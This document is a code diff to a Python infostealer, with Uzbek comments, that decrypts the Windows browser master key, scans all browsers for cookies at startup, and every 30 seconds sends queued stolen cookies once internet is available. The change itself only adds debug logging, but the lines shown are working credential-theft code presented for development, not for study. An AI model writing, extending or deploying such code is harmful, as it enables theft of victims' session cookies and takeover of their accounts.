@@ -200,7 +200,8 @@ def get_master_key(local_state_path):
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         encrypted_key = encrypted_key[5:]
         return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    except Exception:
+    except Exception as e:
+        debug_print(f"Master key olishda xato: {e}")
         return None
 
 def decrypt_value(encrypted_value, master_key):
@@ -311,12 +312,13 @@ def main():
     debug_print("Skript ishga tushdi...")
     check_for_updates()
 
-    # 1. Kompyuter yonganda bir martta barcha brauzerlarni tekshirib chiqamiz va topilganlarini yig'amiz
+    # 1. Kompyuter yonganda bir martta barcha brauzerlarni tekshirib chiqamiz
     scan_browsers()
 
-    # 2. Keyin har 30 soniyada faqat internet borligini tekshirib, navbatdagi (pending) cookie'larni jo'natamiz
+    # 2. Keyin har 30 soniyada faqat internet va navbatdagi cookie'larni tekshirib turamiz
     while True:
         try:
+            debug_print("Internet ulanishi tekshirilmoqda...")
             if check_internet():
                 cache = load_cache()
                 pending_queue = cache.get("pending_queue", [])
@@ -339,9 +341,14 @@ def main():
                     cache["sent_cookies"] = sent_cookies
                     cache["pending_queue"] = remaining_queue
                     save_cache(cache)
+                else:
+                    debug_print("Navbatda yuboriladigan cookie'lar yo'q.")
+            else:
+                debug_print("Internet aloqasi yo'q, 30 soniyadan keyin qayta uriniladi...")
         except Exception as e:
             debug_print(f"Internet tekshirish tsiklida xato: {e}")
 
+        debug_print("30 soniya kutish boshlandi...")
         time.sleep(30)
 
 if __name__ == "__main__":
